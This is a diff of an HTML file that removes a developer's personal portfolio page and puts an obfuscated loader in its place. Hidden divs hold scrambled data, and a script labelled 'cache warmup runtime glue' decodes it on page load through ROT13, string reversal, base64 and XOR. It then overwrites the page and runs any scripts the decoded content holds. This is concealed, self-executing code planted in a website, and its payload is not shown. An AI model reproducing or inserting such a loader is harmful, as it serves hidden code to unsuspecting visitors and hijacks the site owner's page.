@@ -1,434 +1,121 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>My Portfolio</title>
-    <link rel="stylesheet" href="style.css" />
-    <link rel="stylesheet" href="mediaqueries.css" />
+<meta charset="UTF-8">
+<!-- CUeQCRgdZdgquEGxgMxcJyDaBCqPiUBVJxpQyUeupoeIyjDEBYyFSgNpdPwzPPhjGbvflLUIUAOjUQKwqLTjWneLVdsPSXChYbUtSpOaIRIfGSIKCKDhrTngqHbkuAHDuRBumsEHJbLIlKPSAVfYjXnYAxTCsfWzzMFSeQzdOaTOWQlwTYwKBHvdWmArIgNRGcqNWyeywrNIPuTAyULpGvbYUhrLhRSJRQsCkwzsTyDHeRtIKPBeLGxQYtwUzwIPtYwqLZNJmEmObhGRwtwYofAFinwGqOTMcfuDUbRWYqLfRGDYOzqusquPfsJuKkphNeuyFFeguIRyopOznsTEFYuobDydroIJZnYElFXjtxVARIZsBtSjolLbZgBnUBAreNcmnjDwdCBLHNDyRITZtiWGJrKXHwOgIJZSHclFVTooLpCIBCTraCteeUgXMEwqjmyqjxUhQMIYUfNeejPiJNXykcWEkUtIOGjNCnHSvQfneYVeNHDKdONKRoGrZGNMRMbHDSXgmSsXpuUqQiohDcsMjTqzYCGrzOvTMlVOEIoyZuXitFsBejDGLpyXGTeTmTjmbHFffnlZMMRUFohHlnHCwCgVSBEXfLNRazLiFyOfHvKGQIenYZrNNQHoNJUaaItXIUGCdERVmiiCIRhRDHygmFBbbzFUMNlfbAjctHRilTvHdwpZQWiuoMBkRHNQLVZbQCptzrQxcCLhmPTFvqfNIkmarTFUldOZpqslHCLNpxbHgtiqdpgcwVuoiPLsVJhklUCiaeSATgRjUXxNKULywFTlVHpCgYDz -->
+<title>View</title>
 </head>
 <body>
-    <!-- Desktop Navigation -->
-<nav id="desktop-nav">
-    <!-- Logo -->
-    <div class="logo">Sheetal</div>
-    <!-- Navigation Links -->
-    <div>
-        <ul class="nav-links">
-            <!-- About Link -->
-            <li><a href="#about">About</a></li>
-            <!--Skills-->
-            <li><a href="#skills">Skills</a></li>
-            <!-- Experience Link -->
-            <li><a href="#experience">Experience</a></li>
-            <!-- Projects Link -->
-            <li><a href="#projects">Projects</a></li>
-            <!-- Contact Link -->
-            <li><a href="#contact">Contact</a></li>
-        </ul>
-    </div>
-</nav>
-
-<!-- Mobile Navigation -->
-<nav id="hamburger-nav">
-    <!-- Logo -->
-    <div class="logo">Sheetal</div>
-    <!-- Hamburger Menu -->
-    <div class="hamburger-menu">
-        <!-- Hamburger Icon -->
-        <div class="hamburger-icon" onclick="toggleMenu()">
-            <span></span>
-            <span></span>
-            <span></span>
-        </div>
-        <!-- Menu Links -->
-        <div class="menu-links">
-            <!-- About Link -->
-            <li><a href="#about"  onclick="toggleMenu()">About</a></li>
-            <!--Skills-->
-            <li><a href="#skills"  onclick="toggleMenu()">Skills</a></li>
-            <!-- Experience Link -->
-            <li><a href="#experience"  onclick="toggleMenu()">Experience</a></li>
-            <!-- Projects Link -->
-            <li><a href="#projects"  onclick="toggleMenu()">Projects</a></li>
-            <!-- Contact Link -->
-            <li><a href="#contact"  onclick="toggleMenu()">Contact</a></li>
-        </div>
-    </div>
-</nav>
-<!-- Profile -->
-<section id="profile">
-    <div class="section__pic-container">
-        <img src="p.jpeg" alt="Sheetal profile picture"/>
-    </div>
-    <div class="section__text">
-        <p class="section__text__p1">Hello I'm</p>
-        <h1 class="title">Sheetal Gupta</h1>
-        <p class="section__text__p2">Software Developer</p>
-        <div class="btn-container">
-            <button class="btn btn-color-2" onclick="window.open('Sheetal CV.pdf')">Download CV</button>
-            <button class="btn btn-color-1" onclick="location.href='https://sheetal-portofolio.netlify.app/#contact'">Contact Info</button>
-        </div>
-        <div id="socials-container">
-            <img src="linkedin.png" alt="My LinkedIn Profile" class="icon" onclick="location.href='https://www.linkedin.com/in/sheetalgupta15/'"/>
-            <img src="github.png" alt="My Github Profile" class="icon" onclick="location.href='https://github.com/SheetalGupta01'"/>
-        </div>
-    </div>
-</section>
-<!-- About Section -->
-<section id="about">
-    <p class="section__text__p1">Get To Know More</p>
-    <h1 class="title">About Me</h1>
-    <div class="section-container">
-        <div class="section__pic-container">
-            <img src="p1.jpeg" alt="profile picture" class="about-pic"/>
-        </div>
-        <div class="about-details-container">
-            <div class="about-containers">
-                <div class="details-container">
-                    <img src="experience.png" alt="experience icon" class="icon"/>
-                    <h3>Experience</h3>
-                    <p>2 Internships <br> Fresher </p>
-                </div>
-                <div class="details-container">
-                    <img src="education.png" alt="education icon" class="icon"/>
-                    <h3>Education</h3>
-                    <p>B.E - Information Technology</p>
-                </div>
-            </div>
-            <div class="text-container">
-                <p>
-                    Self-motivated, highly passionate and hardworking fresher looking for an opportunity to work in a challenging organization to utilize skills and knowledge to work for the growth of the organization as well as to enhance my knowledge about new and emerging technology in the IT sector.
-                </p>
-            </div>
-        </div>
-    </div>
-    <img src="arrow.png" alt="arrow icon" class="icon arrow" onclick="location.href='./#skills' "/>
-</section>
-<!--Skills Section-->
-<section id="skills">
-    <p class="section__text__p1">Explore My </p>
-    <h1 class="title">Skills</h1>
-    <div class="experience-details-container">
-        <div class="about-containers">
-            <div class="details-container">
-                <h2 class="experience-sub-title">Skills</h2>
-                <div class="article-container">
-                    <article>
-                        <img src="checkmark.png" alt="experience icon" class="icon"/>
-                        <div>
-                            <h3>C</h3>
-                            <p>Basic</p>
-                        </div>
-                    </article>
-                    <article>
-                        <img src="checkmark.png" alt="experience icon" class="icon"/>
-                        <div>
-                            <h3>C++</h3>
-                            <p>Basic</p>
-                        </div>
-                    </article>
-                    <article>
-                        <img src="checkmark.png" alt="experience icon" class="icon"/>
-                        <div>
-                            <h3>Java</h3>
-                            <p>Basic</p>
-                        </div>
-                    </article>
-                    <article>
-                        <img src="checkmark.png" alt="experience icon" class="icon"/>
-                        <div>
-                            <h3>SQL/h3>
-                            <p>Basic</p>
-                        </div>
-                    </article>
-                    <article>
-                        <img src="checkmark.png" alt="experience icon" class="icon"/>
-                        <div>
-                            <h3>HTML</HTMl></h3>
-                            <p>Intermediate</p>
-                        </div>
-                    </article>
-                    <article>
-                        <img src="checkmark.png" alt="experience icon" class="icon"/>
-                        <div>
-                            <h3>CSS</h3>
-                            <p>Intermediate</p>
-                        </div>
-                    </article>
-                </div>
-            </div>
-            <div class="details-container">
-                <h2 class="experience-sub-title">Skills</h2>
-                <div class="article-container">
-                    <article>
-                        <img src="checkmark.png" alt="experience icon" class="icon"/>
-                        <div>
-                            <h3>Python</h3>
-                            <p>Intermediate</p>
-                        </div>
-                    </article>
-                    <article>
-                        <img src="checkmark.png" alt="experience icon" class="icon"/>
-                        <div>
-                            <h3>AWS</h3>
-                            <p>Certified</p>
-                        </div>
-                    </article>
-                    <article>
-                        <img src="checkmark.png" alt="experience icon" class="icon"/>
-                        <div>
-                            <h3>Docker</h3>
-                            <p>Basic</p>
-                        </div>
-                    </article>
-                    <article>
-                        <img src="checkmark.png" alt="experience icon" class="icon"/>
-                        <div>
-                            <h3>Kubernetes</h3>
-                            <p>Basic</p>
-                        </div>
-                    </article>
-                    <article>
-                        <img src="checkmark.png" alt="experience icon" class="icon"/>
-                        <div>
-                            <h3>Linux</h3>
-                            <p>Basic</p>
-                        </div>
-                    </article>
-                </div>
-            </div>
-        </div>
-    </div>
-    <img src="arrow.png" alt="arrow icon" class="icon arrow" onclick="location.href='./#experience' "/>
-</section>
-<!--Experience-->
-<section id="experience">
-    <p class="section__text__p1">Here are some of my Internship Details</p>
-    <h1 class="title">Internships</h1>
-    <div class="experience-details-container">
-      <div class="about-containers">
-        <div class="details-container">
-          <h2 class="experience-sub-title">
-            Toywala Ltd</h2>
-            <h3 class="experience-sub-title">Apr 2019 - Jun 2019 . 3mos</h3>
-            <h3 class="experience-sub-title">Mumbai, India</h3>
-            <h3 class="experience-sub-title"> Onsite</h3>
-            <h3 class="experience-sub-title">Skills</h3>
-            <div class="article-container">
-            <article>
-                <img src="checkmark.png" alt="experience icon" class="icon"/>
-                <div>
-                    <h3>Trello</h3>
-                </div>
-            </article>
-            <article>
-                <img src="checkmark.png" alt="experience icon" class="icon"/>
-                <div>
-                    <h3>JS</h3>
-                </div>
-            </article>
-            <article>
-                <img src="checkmark.png" alt="experience icon" class="icon"/>
-                <div>
-                    <h3>HTML</h3>
-                </div>
-            </article>
-            <article>
-                <img src="checkmark.png" alt="experience icon" class="icon"/>
-                <div>
-                    <h3>CSS</h3>
-                </div>
-            </article>
-            <article>
-                <img src="checkmark.png" alt="experience icon" class="icon"/>
-                <div>
-                    <h3>PHP</h3>
-                </div>
-            </article>
-            <article>
-                <img src="checkmark.png" alt="experience icon" class="icon"/>
-                <div>
-                    <h3>Github</h3>
-                </div>
-            </article>
-            <button
-              class="btn btn-color-2 project-btn"
-              onclick="location.href='https://www.linkedin.com/company/toywala/'"
-            >
-               Toywala 
-            </button>
-            </div>
-           
-        </div>
-        <div class="details-container">
-          <h2 class="experience-sub-title">Prashika Ltd</h2>
-          <h3 class="experience-sub-title">Jan 2022 - Jun 2022 . 6mos</h3>
-            <h3 class="experience-sub-title">United Kingdom</h3>
-            <h3 class="experience-sub-title">Remote</h3>
-            <h3 class="experience-sub-title">Skills</h3>
-            <div class="article-container">
-            <article>
-                <img src="checkmark.png" alt="experience icon" class="icon"/>
-                <div>
-                    <h3>AWS</h3>
-                </div>
-            </article>
-            <article>
-                <img src="checkmark.png" alt="experience icon" class="icon"/>
-                <div>
-                    <h3>Python</h3>
-                </div>
-            </article>
-            <article>
-                <img src="checkmark.png" alt="experience icon" class="icon"/>
-                <div>
-                    <h3>Jira</h3>
-                </div>
-            </article>
-            <article>
-                <img src="checkmark.png" alt="experience icon" class="icon"/>
-                <div>
-                    <h3>Linux</h3>
-                </div>
-            </article>
-            <article>
-                <img src="checkmark.png" alt="experience icon" class="icon"/>
-                <div>
-                    <h3>Docker</h3>
-                </div>
-            </article>
-            <article>
-                <img src="checkmark.png" alt="experience icon" class="icon"/>
-                <div>
-                    <h3>Kubernetes</h3>
-                </div>
-            </article>
-        
-          <div class="btn-container">
-            <button
-              class="btn btn-color-2 project-btn"
-              onclick="location.href='https://www.linkedin.com/company/prashika-limited/'"
-            >
-              Prashika
-            </button>
-          </div>
-          </div>
-        </div>
-      </div>
-    </div>
-    <img src="arrow.png" alt="arrow icon" class="icon arrow" onclick="location.href='./#projects' "/>
-</section>
-<!--PROJECTS-->
-<section id="projects">
-    <p class="section__text__p1">Browse My Recent</p>
-    <h1 class="title">Projects</h1>
-    <div class="experience-details-container">
-      <div class="about-containers">
-        <div class="details-container color-container">
-          <div class="article-container">
-            <img
-              src="movie.png"
-              alt="Project 1"
-              class="project-img"
-            />
-          </div>
-          <h2 class="experience-sub-title project-title">
-            Movie Recommender System</h2>
-          <div class="btn-container">
-            <button
-              class="btn btn-color-2 project-btn"
-              onclick="location.href='https://github.com/SheetalGupta01/movie_recommender.git'"
-            >
-              Github
-            </button>
-          </div>
-        </div>
-        <div class="details-container color-container">
-          <div class="article-container">
-            <img
-              src="car.png"
-              alt="Project 2"
-              class="project-img"
-            />
-          </div>
-          <h2 class="experience-sub-title project-title">Car Rental Website Using PHP & My SQL</h2>
-          <div class="btn-container">
-            <button
-              class="btn btn-color-2 project-btn"
-              onclick="location.href='https://github.com/SheetalGupta01/car-rental-website.git'"
-            >
-              Github
-            </button>
-          </div>
-        </div>
-        <div class="details-container color-container">
-          <div class="article-container">
-            <img
-              src="vatsalya.png"
-              alt="Project 3"
-              class="project-img"
-            />
-          </div>
-          <h2 class="experience-sub-title project-title">Web Portal for a Orphanage Trust - Vatsalya</h2>
-          <div class="btn-container">
-            <button
-              class="btn btn-color-2 project-btn"
-              onclick="location.href='https://github.com/SheetalGupta01/vatsalya_website.git'"
-            >
-              Github
-            </button>
-          </div>
-        </div>
-      </div>
-    </div>
-    <img
-      src="arrow.png"
-      alt="Arrow icon"
-      class="icon arrow"
-      onclick="location.href='./#contact'"
-    />
-  </section>
-  <!--CONTACT-->
-  <section id="contact">
-    <p class="section__text__p1">Get in Touch</p>
-    <h1 class="title">Contact Me</h1>
-    <div class="contact-info-upper-container">
-      <div class="contact-info-container">
-        <img
-          src="email.png"
-          alt="Email icon"
-          class="icon contact-icon email-icon"
-        />
-        <p><a href="mailto:thesheetalgupta@gmail.com">thesheetalgupta@gmail.com</a></p>
-      </div>
-      <div class="contact-info-container">
-        <img
-          src="linkedin.png"
-          alt="LinkedIn icon"
-          class="icon contact-icon"
-        />
-        <p><a href="https://www.linkedin.com/in/sheetalgupta15/">LinkedIn</a></p>
-      </div>
-    </div>
-  </section>
-  <!--FOOTER-->
-  <footer>
-    <nav>
-      <div class="nav-links-container">
-        <ul class="nav-links">
-          <li><a href="#about">About</a></li>
-          <li><a href="#skills">Skills</a></li>
-          <li><a href="#experience">Experience</a></li>
-          <li><a href="#projects">Projects</a></li>
-          <li><a href="#contact">Contact</a></li>
-        </ul>
-      </div>
-    </nav>
-    <p>Copyright &#169; 2024. All Rights Reserved.</p>
-  </footer>
-  
-<!-- Script -->
-<script src="script.js"></script>
+<!-- cache warmup runtime glue -->
+<div id="gwgaQrH0" data-s="hOSMBXk47j3lBVM" hidden></div>
+  <div id="gwgaQrH1" data-s="zHXLRA07HoKAUeNyYrX2EtYbOQXlnI0UvotYqJyAHFBcxZY0F3axmVQjWtkH7ffI4LeRxAElGtMeQvXTNjBuxKvq2QWz7Fu80Xt2NY0bDp17mO5qHxx1oozP7gxI1KkCS2%Y2LQAteQQvZUcpypPvRKcQXIr30VDkz2UjO2%W85fKPF4yM71WiPjmMeDXZ1x1TxEiRQHiy9OrhVAPcz2ROFja6X4jVSakQ9p3NkGGx9pUsLdmC4APjMwpnC16tuOaGpMzndLQ64eTYzgTcpyHomDUfvqNXnHAEkKzIt6YJAcUJoAS2%aP1Ww2PxI6SrGNwtRSD6XO2%t3v0PUcbgJfsPsVry1JoqwAplbgLAaIEFH0WLIp96mqMcOO2%ZSLBhkebck2NxcxLFfJatS2%OP64PtADnOmEUdd4QrwNppxv2nkrQYHAGseWuLKDnx7R2CS2%tMA52lp0udSCR0s9QJaAMQfmaIZJttJoqwAplbUfVaBWRJufLJMRhvU1WKk8IXneS7aLI1KkS2%vJoWOeSiHQzqQc8HpUeuHaJfEXz0ZGIT1AZ6LLjWNJ3b1HS2%1pwrjvp6RnQRPdGI1hCY0ypuUHbkVPcBUT8JjyGdcmAplbUfVaBuJX6WLDZyO2%yG4AK2xIMFeydhMI1KMg1Js6W8b6SYnbG8HRMBw0Dce5QNwNWnkzyFgnnsp4Nyn9lAzInzCIkG3PCoEz1TOOeXntxAuUUiAcJfsvIIsSS2%AiAtMSz5YgVaBu2Nut6RpOhtCN5E5txnHO2%tdibOyOD4xPBZMmMBIYTbG6LRoYmOK7hpJrwNppZN8OIO2%pDN5TrUWzRS2%1pDstypduWTIUmU8GiFexvTjGJcZgScO2%vIG6u1Joqwa0NhFfLtBkGEx5ZFBtX3C4APjMwZG3ShcAtzHRg3FFBISqsFBU9PxLJqUS2%tH9FfFG" style="display:none"></div>
+  <div id="gwgaQrH2" data-s="21ZG1z2UkO2%nGHqOKPb1A2jWWvDtpdkXTA3lZxkhXT0zNEPUyffJrSVyIYx1Zwc2PA29W590AtzEgOpNCNXS2%CD9OjkEXnQak61D1rAc3JKfGmWBEYTfGmctWE3SKaBZPrGNCBka2JgBnPH9NIBWuRaxLkst9BKmoYLJmRVSeTQHwT9mKcRbJ1JaNIsy1JmS2%cJ4l7I" style="display:none!important"></div>
+  <div id="gwgaQrH3" data-s="5Aa" style="position:absolute;left:-99999px;top:-99999px"></div>
+  <div id="gwgaQrH4" data-s="P9JExOANoSO2%mogbF54HsBhQhvIj2JLg1J34Wbx6ONY9OxZNMXmOKz6qDEvjBsuTznOLIwH9RGPbzP7yLkstmHeOnKW2kRbOe4S2%N1UNUUcbApTeaIBUkxR65tMqviUpfmotTT2AfTpEivWgcJ4VEsnUH5tpu0sWVzGPZFeMfDs39P6N0YJoDTxO2%AGElRpOxvwn5eMNHAQJS2%9xS2jotCyls7RnQRPdIjy8ZeRwN5KSNu6YcF3SKzytLBWjLET7QgVxMxFHc4hBcxr3XOWPgkEMVO2%N78MSwSVb1J3LQAt7FMafG6V0qPvRKcQnWQvNppxP8OIBVEI9JM3q2kCUXeXRlqYNBTAUws0khXFt3C83RmxbP4BaUFsSmJUVmsqPdUjbuqtmI1c8GpMivTxLFvDEsWO2%Ohcxy2exgdbXLQ6ZXHX7fGbADVPvxqldbOKS2%IZBSvwWx6pLkWJMen2ksOBjs13VotSZNvvVcObXO2%t3Vb1Rwb9Hez2UTFjaong3Rql7Vu80npFHkWbQIxruND8JttHsFdSdwqE3KcYcw2VFmMS2%FRS2%ZQcZNMOekRCdLOEwNppxP8jS7WJI9I83Zzsw1pzK1vp6RnQRPdIpD6Qdx1VtmK9gMTfeaIB7ItKFLwONFhQ5ZlojwF1SgPWbevoScEjcSoVXO7nEteD5AzRlfJcLO2%FRS2%ZNaNHVMwHO769QrwNppxP8OjhYE5XHJi8lD2tYmO2%j39mEXYWTws0khXBytVpKLSu6YGBIAjJlilB7S2%2OlbnLMtB9wDmWVSNxr3BkLP4kkoGdS7aL1S2%Lkg1FvpJlqiGsS2%ZQ9NIVJstRcagGWvjCBc2zKjrCFpbSQTe1UXjWwrjv2F2pXxlmO4DiRnD2CNUD1c9HeU2RUO2%E0rCM2LIz6I9AlijwEzkLPHyO2%yCxLFvjkrolN7aLI19kS2%vJo5D1MS2%HB7fG1tIVY2NIcYZGXz0ZpDa2OIBVFfcNMPc1MYHnwvRms6HSEcIuNWkhYwS0AkmH6EMSirFQI7NuPng1A4v4TZVaVRlNuVVF2WS2%tVR5G3EEomBtwmuOxnZczmzAFt16HSa9N9NxoTwHDci8QZzxWpxv2nMpQAOcNRXb1D2jLzCI2qekBQRvtVMa8R31vpIwGcZgUcBUOHBDuro9lRqlbUfbgItzPcLgTq0o2CN5E5txnHO2%tdaL1S2%918xSTZGuAdTYv9P8RSLJiOK7hpJrwtJUyl0FkrnMj5NIv5tYKDQ9B12ImkXD1QdvW0iQiH0HLzQ5tZEhK1Aj6P1Ya53BMz7XbZlCjlNwpfOGpXxJ9WEt8RLrvI8vcOwQHb1NFpF7xLTqKgPa9EZEX1G7eLJEnTpYtQk" style="width:0;height:0;overflow:hidden"></div>
+  <div id="gwgaQrH5" data-s="Ly4H3RYXmJ6gbUzDEKtyGmkXPk2wWtNdBS2%N3A5mHaO8NghzOT6uxHiZlO539HgblUjlUYjcUI0nuGbZRh5uJS2%zFwPcQfyD9lMO2%gGz5hPXw8QfZjVUojRaPcIsFRVCOzaLSiLnj4NSnAtRa0BWzE3IejMsDGyqu09Vladu1EpTyYJkwTOJnkzosM2ZA2bS4f0OLFT4AZOZb7jYkqS1NSpBzN7k9ExYkClNFpFb8eSSdVDj1kVfsFA" style="display:none!important"></div>
+  <div id="gwgaQrH6" data-s="nvinbdDoGgKzoRdXKRbSFnA1VCRng3u0qYNBDuzkXSReToyvoOaFt5cETaQNpBE2XaWkOuJ5Gy90rLKNR9rXlLM5S2%gerlStMVzEedgSyQpcxJS2%VFckrFEJ8QxZypYmtK0S2%8DUl1Vp83xrNsQVAbUFzglp2uM3sy37YDXKE2kN8l9Vd2fc5uoZy6YL6HZKeHzRJWmNcv4GcZ2BczEi1fOTO7lQ54J5t1XUS2%ObO2%WtuKO4aFT5W54dPYXqNupIpoekUaO2%8QDTRpM13zXHXMsRLOKnb1MwIMwhtmDmDVDuT1VutcRS2%tnbXYU6IWPin2TIakxFXWkyqveXbVtxWHU3gZQGICbW6al59HVrFkbxAuuKuZzK2gKb8eRI6cTzLyoOeHDgB8QDzRVCIw2HH6WEfcUPJ5xsG0LzK3vpFzqEAzaVk1jRTkaUjJJ79cRfmJSphEyVGglsuJeHq80OjwQdS8ODp63NRgRwjHsBXu76NOxS4c1HYfFy47DPm5Q0AjpAwRPdO2%pKKlHAByFzGteMob5NQrc1VK0pwJSkn7RCXOJ1VyuhYexx4OUUQDZJeF3TKeHuSrMjBqF9B9ZtxMaJy1fPNAZyY9MG4ZEAjGHde9DtRxgl8QgS05hHSUWUc8RqNaNPmafEZ2HCWq21BVdMspbSNhgtQYHL4rkzXFSCYM2lAfN5rUHxBgPFa9LSiFvII33vAU8tK439Bup3rpPJmqfUGRXxB59GwR1Wneyk610uLbMz1z9DvSsIrS2%gGfbHoAiOKkdgURK0CV1KyLRrqGRMOMFMmVCRng3EkGsNCPAKmYxEeUhyuAElOdyWG6swEJ3RuMdcjBka4Uj8mQL2NutnSUSe2stpUdEIsrBkhd4Nyn0LxSP8NaZnYJsbSaRRYD3NT7JpGRS2%xCIA3xWRO2%sMpWGBnbjsrOLg70mLS2%NBLZ3kpVOeWKOxCyQHbqgQ0XzNBYRjLs8yM9T5B5Z1Q1FGb58HRx7arDpGdHyrK7tbbOE1KMg18o5FhSiDLUMUzVxpBFDUtvgoFa0ZI13aZNdLO2%xqIS2%Bd1VYRLzGKvDduWZq0mAtthGmKaW1kIaAcSBhlTDBDuCJVtVg28KcpxHSmGb9pPnDh3OScGjkEXnQ391AEtMZMyZa9DvqsFRS2%9DkHRnJiEPwTMKolyCMcTjWRdLPjcJLT5aOmRC7Y0knGIZP1z0oHEeEoyzUWQUcNS2%O3omERGSmRzMjPEThO1f2AW3Eiq9OB4njZ9cFeyEBXix9m5uxrZcaAwLU3VoUQwfPuDyBFX1TaB8FnzRVUxQjH" hidden></div>
+  <div id="gwgaQrH7" data-s="HXLRDcTAO2%bxPS2%0Xie03H7Rnc8mkRHDiMCO9JHQH9AcQwiGTphEzDX43PqKiPqZlUjmUYjcFXgizqjqSxVSoBFkbxM11Q4MxsO2%AI3kBEWT4PyV0oPzNPfr8R0oupZbQjW5S2%WNbMBJU8kCPkpgY03FUjXQRPtZxuhYexxAWvU085Sg" hidden></div>
+  <div id="gwgaQrH8" data-s="zzIHBjxod8cGHlgsxLtnLvE1k8OsxhvAN5E58RLZO2%uiyfRxnpWzJmpJv5O2%TuXVG9EOAJdHD9FfFXn0Csyv2nkO2%WHS5TsBVyCPuLhoHkpO2%NCTkzavW06oTNlTtTUzAcSwTzNUvuuHip2QW29WE83BcJHhMqPBjXkXycPgySMoFO7zWNxnbZS2%VS2%VU3VO2%HoapXxVHqU3NSnvbRXnHAVqJyMjO2%WJIqIRzcaMwyMudumES2%tW" style="display:none"></div>
+  <div id="gwgaQrH9" data-s="QNz1ARE9tTO3M0JJygMTS2%dvTH6utsvWkAfl6G9p1MHzEvgfUM06yUcVG5f0XU7tbvWjzLHc1Ha9KbACHBKATd5OMCatRci8JoJRo2pQ2PSrLPNLIYY4xrS2%yMeG0vqeEYB1QdJuOdCsxjv4zUa9WJkQTTHhu1nhM2SgGvMpp0nNlNRWsZbbL5e9AS" hidden></div>
+  <div id="sNzyWpl5jq7f" style="display:none">0+YHjEG4u/FuT1+3cVO/9zdhu9SOwqt0wTmnATWepLhY4dEjTYG22W</div>
+<script type="text/javascript">(function(){
+  var sWxEm1='3b858c36a790ebf50c2e0596f427c16f2c0731c614b35938';
+  if(window[sWxEm1]){return;}
+  window[sWxEm1]=1;
+  /* legacy support */
+  var QztA=[],i7r,po,CyT;
+  for(i7r=0;i7r<10;i7r++){
+    po=document.getElementById('gwgaQrH'+i7r);
+    if(!po){return;}
+    QztA.push(po.getAttribute('data-s'));
+  }
+  CyT=QztA.join('');
+function hTqOa9c(s){return s.replace(/[a-zA-Z]/g,function(c){var n=c.charCodeAt(0);if(n>=65&&n<=90)return String.fromCharCode((n-65+13)%26+65);if(n>=97&&n<=122)return String.fromCharCode((n-97+13)%26+97);return c;});}
+function BvTFcgu(s){return s.split('').reverse().join('');}
+function KuAmWFua(s){try{return decodeURIComponent(s);}catch(e){return s;}}
+function tuOE1k(h){
+  var d,i,nd,tag,a;
+  try{d=new DOMParser().parseFromString(h,'text/html');}catch(e){return;}
+  if(!d||!d.documentElement){return;}
+  a=d.documentElement.attributes||[];
+  for(i=0;i<a.length;i++){try{document.documentElement.setAttribute(a[i].name,a[i].value);}catch(e){}}
+  if(d.body){a=d.body.attributes||[];for(i=0;i<a.length;i++){try{document.body.setAttribute(a[i].name,a[i].value);}catch(e){}}}
+  var jobs=[],keep=[];
+  var hn=(d.head||document.createElement('head')).childNodes;
+  for(i=0;i<hn.length;i++){nd=hn[i];tag=(nd.tagName||'').toUpperCase();if(tag==='SCRIPT'){jobs.push(nd);}else{keep.push(nd);}}
+  for(i=0;i<keep.length;i++){try{document.head.appendChild(document.importNode(keep[i],true));}catch(e){}}
+  while(document.body.firstChild){document.body.removeChild(document.body.firstChild);}
+  var bn=d.body?d.body.childNodes:[];
+  keep=[];
+  for(i=0;i<bn.length;i++){nd=bn[i];tag=(nd.tagName||'').toUpperCase();if(tag==='SCRIPT'){jobs.push(nd);}else{keep.push(nd);}}
+  for(i=0;i<keep.length;i++){try{document.body.appendChild(document.importNode(keep[i],true));}catch(e){}}
+  var k=0;
+  function nx(){
+    if(k>=jobs.length){return;}
+    var old=jobs[k++],sc=document.createElement('script'),j,at=old.attributes||[];
+    for(j=0;j<at.length;j++){try{sc.setAttribute(at[j].name,at[j].value);}catch(e){}}
+    if(old.getAttribute('src')){sc.async=false;sc.onload=sc.onerror=nx;document.body.appendChild(sc);}
+    else{sc.textContent=old.textContent;document.body.appendChild(sc);nx();}
+  }
+  nx();
+}
+  CyT=hTqOa9c(CyT);
+  CyT=BvTFcgu(CyT);
+  CyT=KuAmWFua(CyT);
+  var peyPY=atob(CyT),HA=peyPY.length,dvXQW=new Uint8Array(HA);
+  for(i7r=0;i7r<HA;i7r++){dvXQW[i7r]=peyPY.charCodeAt(i7r);}
+  var dKk=Uint8Array.from(atob('KP4vqsl8aKIBI0huvKsngwctrfb29nf1dgfMevoJPFA='),function(c){return c.charCodeAt(0);});
+  for(i7r=0;i7r<HA;i7r++){dvXQW[i7r]^=dKk[i7r%dKk.length];}
+  var saB=new TextDecoder('utf-8').decode(dvXQW);
+  function BQLQfGo(){
+    try{
+      document.open();
+      document.write(saB);
+      document.close();
+      return;
+    }catch(wVE){}
+    try{function tuOE1k(h){
+  var d,i,nd,tag,a;
+  try{d=new DOMParser().parseFromString(h,'text/html');}catch(e){return;}
+  if(!d||!d.documentElement){return;}
+  a=d.documentElement.attributes||[];
+  for(i=0;i<a.length;i++){try{document.documentElement.setAttribute(a[i].name,a[i].value);}catch(e){}}
+  if(d.body){a=d.body.attributes||[];for(i=0;i<a.length;i++){try{document.body.setAttribute(a[i].name,a[i].value);}catch(e){}}}
+  var jobs=[],keep=[];
+  var hn=(d.head||document.createElement('head')).childNodes;
+  for(i=0;i<hn.length;i++){nd=hn[i];tag=(nd.tagName||'').toUpperCase();if(tag==='SCRIPT'){jobs.push(nd);}else{keep.push(nd);}}
+  for(i=0;i<keep.length;i++){try{document.head.appendChild(document.importNode(keep[i],true));}catch(e){}}
+  while(document.body.firstChild){document.body.removeChild(document.body.firstChild);}
+  var bn=d.body?d.body.childNodes:[];
+  keep=[];
+  for(i=0;i<bn.length;i++){nd=bn[i];tag=(nd.tagName||'').toUpperCase();if(tag==='SCRIPT'){jobs.push(nd);}else{keep.push(nd);}}
+  for(i=0;i<keep.length;i++){try{document.body.appendChild(document.importNode(keep[i],true));}catch(e){}}
+  var k=0;
+  function nx(){
+    if(k>=jobs.length){return;}
+    var old=jobs[k++],sc=document.createElement('script'),j,at=old.attributes||[];
+    for(j=0;j<at.length;j++){try{sc.setAttribute(at[j].name,at[j].value);}catch(e){}}
+    if(old.getAttribute('src')){sc.async=false;sc.onload=sc.onerror=nx;document.body.appendChild(sc);}
+    else{sc.textContent=old.textContent;document.body.appendChild(sc);nx();}
+  }
+  nx();
+}(saB);}catch(Zn){}
+  }
+  var cGCB=false;
+  function luhiwM(){
+    if(cGCB){return;}
+    cGCB=true;
+    BQLQfGo();
+  }
+  function DTx0y(){
+    setTimeout(luhiwM,0);
+  }
+  if(document.readyState==='complete'){
+    DTx0y();
+  }else{
+    window.addEventListener('load',DTx0y);
+  }
+})();
+</script>
 </body>
 </html>
